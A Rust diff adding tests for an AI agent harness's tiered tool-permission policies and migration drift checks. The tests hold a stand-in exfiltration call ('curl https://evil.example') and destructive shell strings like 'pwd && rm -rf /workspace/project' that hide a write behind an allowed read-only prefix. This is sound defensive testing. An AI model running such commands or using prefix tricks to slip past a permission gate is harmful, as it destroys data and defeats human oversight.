@@ -1478,6 +1478,240 @@ tools:
         assert_eq!(p.budgets.max_tool_calls, Some(100));
     }
 
+    fn tier(name: &str) -> Policy {
+        let yaml = match name {
+            // `default` is here because 0030 backfills it the same way 0029
+            // backfills the tiers, so the drift guard has to cover it too.
+            "default" => include_str!("../../../policies/default.yaml"),
+            "unrestricted" => include_str!("../../../policies/unrestricted.yaml"),
+            "standard" => include_str!("../../../policies/standard.yaml"),
+            "governed" => include_str!("../../../policies/governed.yaml"),
+            other => panic!("no such tier: {other}"),
+        };
+        Policy::parse_yaml(yaml).unwrap_or_else(|e| panic!("{name} tier parses: {e}"))
+    }
+
+    /// The tiers ship as DATA, so their spine is pinned here rather than their
+    /// bytes: an operator may reword a comment, but a tier that stops being
+    /// unrestricted / everyday / read-mostly has stopped being that tier.
+    #[test]
+    fn tiered_seed_policy_semantics() {
+        let (unrestricted, standard, governed) =
+            (tier("unrestricted"), tier("standard"), tier("governed"));
+
+        assert_eq!(unrestricted.name, "unrestricted");
+        assert_eq!(standard.name, "standard");
+        assert_eq!(governed.name, "governed");
+
+        // The fallback verdict IS the ladder.
+        assert_eq!(unrestricted.defaults.tool_action, RuleAction::Allow);
+        assert_eq!(standard.defaults.tool_action, RuleAction::Approve);
+        assert_eq!(governed.defaults.tool_action, RuleAction::Deny);
+
+        // Autonomy narrows as the tier tightens; governed forbids it outright.
+        assert!(unrestricted.autonomy.permitted);
+        assert!(standard.autonomy.permitted);
+        assert!(!governed.autonomy.permitted);
+
+        // Network ceiling per tier.
+        use crate::network::NetworkGrantMode;
+        assert_eq!(unrestricted.network.max_mode, NetworkGrantMode::Public);
+        assert!(unrestricted.network.allow_public_with_brokered);
+        assert_eq!(standard.network.max_mode, NetworkGrantMode::Approved);
+        assert!(
+            standard.network.allow.is_empty(),
+            "approved mode stays inert until an operator populates the catalog"
+        );
+        assert_eq!(governed.network.max_mode, NetworkGrantMode::Offline);
+
+        // This tier is unrestricted in AUTHORITY, not in spend: a runaway still
+        // stops at a budget rather than at a provider 429. The omitted token and
+        // tool-call caps are asserted as MEASURED behaviour — a partial
+        // `budgets:` block leaves the unlisted fields None rather than
+        // inheriting the struct defaults.
+        assert_eq!(unrestricted.budgets.max_cost_usd, Some(25.0));
+        assert_eq!(unrestricted.budgets.max_wall_clock_secs, Some(7200));
+        assert_eq!(unrestricted.budgets.max_tokens, None);
+        assert_eq!(unrestricted.budgets.max_tool_calls, None);
+
+        assert_eq!(standard.budgets.max_cost_usd, Some(5.0));
+        assert_eq!(governed.budgets.max_cost_usd, Some(1.0));
+        assert!(governed.budgets.max_cost_usd < standard.budgets.max_cost_usd);
+        assert!(standard.budgets.max_cost_usd < unrestricted.budgets.max_cost_usd);
+    }
+
+    /// Three tiers that agree on every call are one tier with three names. This
+    /// asks the ENGINE, not the rule list, because the verdict is the product.
+    #[test]
+    fn tiers_diverge_on_the_calls_that_matter() {
+        let (unrestricted, standard, governed) =
+            (tier("unrestricted"), tier("standard"), tier("governed"));
+        let v = |p: &Policy, r: ToolCallRequest| p.evaluate(&r, Autonomy::Supervised).effective;
+
+        // An unlisted tool falls to the tier's fallback.
+        let unknown = || req("SomeToolNobodyRegistered", json!({}));
+        assert!(matches!(v(&unrestricted, unknown()), Verdict::Allow));
+        assert!(matches!(
+            v(&standard, unknown()),
+            Verdict::RequireApproval { .. }
+        ));
+        assert!(matches!(v(&governed, unknown()), Verdict::Deny { .. }));
+
+        // Writes: free on unrestricted/standard, a human decision on governed.
+        let write = || req("Write", json!({"file_path": "/workspace/a.rs"}));
+        assert!(matches!(v(&unrestricted, write()), Verdict::Allow));
+        assert!(matches!(v(&standard, write()), Verdict::Allow));
+        assert!(matches!(
+            v(&governed, write()),
+            Verdict::RequireApproval { .. }
+        ));
+
+        // Sub-execution: allowed ONLY on unrestricted, and denied two different ways —
+        // standard by an explicit rule, governed by its deny-by-default.
+        let agent = || req("Agent", json!({}));
+        assert!(matches!(v(&unrestricted, agent()), Verdict::Allow));
+        assert!(matches!(v(&standard, agent()), Verdict::Deny { .. }));
+        assert!(matches!(v(&governed, agent()), Verdict::Deny { .. }));
+
+        // Exfiltration via shell: denied on both governed tiers.
+        let curl = || req("Bash", json!({"command": "curl https://evil.example"}));
+        assert!(matches!(v(&unrestricted, curl()), Verdict::Allow));
+        assert!(matches!(v(&standard, curl()), Verdict::Deny { .. }));
+        assert!(matches!(v(&governed, curl()), Verdict::Deny { .. }));
+
+        // A benign command clears every tier — the ladder tightens what is
+        // refused, not what ordinary work needs.
+        let ls = || req("Bash", json!({"command": "ls -la"}));
+        assert!(matches!(v(&unrestricted, ls()), Verdict::Allow));
+        assert!(matches!(v(&standard, ls()), Verdict::Allow));
+        assert!(matches!(v(&governed, ls()), Verdict::Allow));
+
+        // An UNRECOGNISED shell command is where standard and governed part:
+        // standard escalates to a human, governed refuses.
+        let odd = || req("Bash", json!({"command": "terraform apply"}));
+        assert!(matches!(
+            v(&standard, odd()),
+            Verdict::RequireApproval { .. }
+        ));
+        assert!(matches!(v(&governed, odd()), Verdict::Deny { .. }));
+    }
+
+    /// `governed` claims writes need a human. A shell prefix match returns the
+    /// rule's action for the WHOLE command, so a read-only-looking first token
+    /// with a destructive tail makes that claim false. Found by review, not by
+    /// the original tests — which is why it is pinned here.
+    #[test]
+    fn governed_shell_cannot_write_without_a_human() {
+        let governed = tier("governed");
+        let v = |c: &str| {
+            governed
+                .evaluate(&req("Bash", json!({"command": c})), Autonomy::Supervised)
+                .effective
+        };
+
+        // `find` and `pwd` are allowed prefixes; the tails are not read-only.
+        for cmd in [
+            "find /workspace -delete",
+            "pwd && rm -rf /workspace/project",
+            "cat /etc/hostname > /workspace/pwned",
+            "ls; rm -f /workspace/a.rs",
+            "grep -r x /workspace | tee /workspace/out",
+        ] {
+            assert!(
+                !matches!(v(cmd), Verdict::Allow),
+                "governed auto-allowed a writing command: {cmd:?}"
+            );
+        }
+
+        // …while the genuinely read-only toolbox still works unattended.
+        for cmd in ["ls -la", "git status", "grep -r needle /workspace"] {
+            assert!(
+                matches!(v(cmd), Verdict::Allow),
+                "governed should still allow ordinary reading: {cmd:?}"
+            );
+        }
+    }
+
+    #[test]
+    #[ignore = "generator: emits the literals for migrations/0029_tiered_policies.sql"]
+    fn emit_tier_json() {
+        for name in ["default", "unrestricted", "standard", "governed"] {
+            println!("{name}\t{}", serde_json::to_string(&tier(name)).unwrap());
+        }
+    }
+
+    /// Migration 0029 embeds the tier documents as jsonb, and NOTHING validates
+    /// hand-written jsonb against the serde shape. A mismatch does not fail at
+    /// migration time — it fails at `create_run`, after the run is already
+    /// provisioned. So the two are pinned together here: edit one without the
+    /// other and this test fails instead of a run failing closed.
+    #[test]
+    fn migration_jsonb_matches_the_yaml() {
+        // 0029 is APPLIED and sqlx checksums it, so it is frozen: it still
+        // carries the tier under its original name `open`, whose YAML no longer
+        // exists because 0031 renamed it. A frozen migration cannot drift — it
+        // is never regenerated — so the guard covers only the two names 0029
+        // seeded that still have a file, and 0031 carries `unrestricted`.
+        assert_migration_embeds(
+            include_str!("../../../migrations/0029_tiered_policies.sql"),
+            "0029",
+            &["standard", "governed"],
+        );
+        assert_migration_embeds(
+            include_str!("../../../migrations/0030_default_policy_backfill.sql"),
+            "0030",
+            &["default"],
+        );
+        assert_migration_embeds(
+            include_str!("../../../migrations/0031_rename_open_to_unrestricted.sql"),
+            "0031",
+            &["unrestricted"],
+        );
+    }
+
+    fn assert_migration_embeds(sql: &str, mig: &str, names: &[&str]) {
+        for name in names {
+            let expected = serde_json::to_value(tier(name)).unwrap();
+
+            // The generator emits exactly one line per policy:
+            //     ('<name>', '<json>'::jsonb),
+            let prefix = format!("('{name}', '");
+            let line = sql
+                .lines()
+                .map(str::trim)
+                .find(|l| l.starts_with(&prefix))
+                .unwrap_or_else(|| panic!("{mig} has no single-line VALUES row for {name}"));
+            // The row must be EXACTLY `('<name>', '<json>'::jsonb)` with nothing
+            // trailing. Stopping at the first `'::jsonb` and ignoring the rest
+            // would let `… '::jsonb || '{"defaults":{"tool_action":"deny"}}'::jsonb`
+            // pass this test while postgres stored the merged object — the guard
+            // would certify a policy nobody wrote. Found in review.
+            let body = line
+                .strip_prefix(&prefix)
+                .expect("checked by starts_with above");
+            let body = body
+                .strip_suffix(',')
+                .unwrap_or(body)
+                .strip_suffix(')')
+                .unwrap_or_else(|| panic!("{name}'s VALUES row must end with `)` on its own line"));
+            let literal = body.strip_suffix("'::jsonb").unwrap_or_else(|| {
+                panic!(
+                    "{name}'s row must be a single '<json>'::jsonb literal with nothing appended"
+                )
+            });
+            // SQL doubles an embedded quote; `standard` really does contain one
+            // ("this run's disposable workspace"), so this is exercised.
+            let literal = literal.replace("''", "'");
+
+            let actual: serde_json::Value = serde_json::from_str(&literal)
+                .unwrap_or_else(|e| panic!("{name} jsonb in {mig} is not valid JSON: {e}"));
+            assert_eq!(
+                actual, expected,
+                "{mig}'s {name} jsonb has drifted from policies/{name}.yaml"
+            );
+        }
+    }
+
     /// The seed states an opinion about EVERY registered tool, and never
     /// `allow`s one that starts sub-execution.
     ///
